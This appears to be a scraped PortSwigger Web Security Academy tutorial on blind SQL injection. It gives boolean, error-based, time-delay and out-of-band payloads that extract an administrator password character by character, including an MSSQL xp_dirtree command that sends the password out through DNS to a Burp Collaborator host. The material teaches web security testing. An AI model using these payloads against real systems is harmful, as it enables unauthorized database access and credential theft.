---
title: "Blind SQL injection"
author: PortSwigger Web Security Academy
url: https://portswigger.net/web-security/sql-injection/blind
date_scraped: 2026-11-19
platform: portswigger
disclosed_report: none
bounty: not stated
vuln_class: sqli
---

<!-- Raw scraped text below. Public reference. -->

# Blind SQL injection

Blind SQLi: the app is vulnerable but its HTTP responses contain neither the query results nor DB error details. UNION attacks do not work; other techniques are needed.

## Conditional responses (boolean-based)
Example: a `TrackingId` cookie used in `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '...'`. Results are not returned, but the app shows "Welcome back" only when the query returns rows.
- `xyz' AND '1'='1` -> condition true -> rows returned -> "Welcome back" shown.
- `xyz' AND '1'='2` -> condition false -> no "Welcome back".
This answers any single injected condition, extracting data one piece at a time. Extract a password character by character:
```
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't
xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
```
(`SUBSTRING` is `SUBSTR` on some DBs; see cheat sheet.) Binary-search the character range for speed.

## Error-based SQLi
Using error messages to extract or infer data, even in blind contexts.
- Conditional errors: induce an error only if a boolean is true; the error (or its absence) changes the response.
  ```
  xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a   -> no error
  xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a   -> divide-by-zero error
  ```
  Extract one char at a time:
  ```
  xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
  ```
- Verbose errors: a misconfigured DB returns the full query in the error (e.g. "Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''"), revealing the injection context.
- Error with data via `CAST()`: convert query output (a string) to an incompatible type to leak it in the error:
  ```
  CAST((SELECT example_column FROM example_table) AS int)
  -> ERROR: invalid input syntax for type integer: "Example data"
  ```
  Useful when a character limit prevents conditional responses.

## Time-based
If the app catches DB errors gracefully, induce a conditional time delay; SQL runs synchronously so delaying the query delays the HTTP response. MSSQL:
```
'; IF (1=2) WAITFOR DELAY '0:0:10'--   -> no delay
'; IF (1=1) WAITFOR DELAY '0:0:10'--   -> 10s delay
```
Extract one char at a time:
```
'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
```
Techniques are DB-specific (see cheat sheet).

## Out-of-band (OAST)
When the query runs asynchronously, response content/error/timing do not depend on it. Trigger out-of-band network interactions to a system you control, inferring data or exfiltrating directly. DNS is typically the most effective (egress is usually allowed). Burp Collaborator is the easiest/most reliable tool. MSSQL DNS lookup:
```
'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
```
Exfiltrate the admin password in the subdomain:
```
'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```
The DNS lookup `S3cure.cwcsgt05...burpcollaborator.net` reveals the password. OAST is often preferable even when other blind techniques work, due to high success rate and direct exfiltration. Techniques are DB-specific.

## Prevention
Same as regular SQLi: parameterized queries so user input cannot alter the query structure.
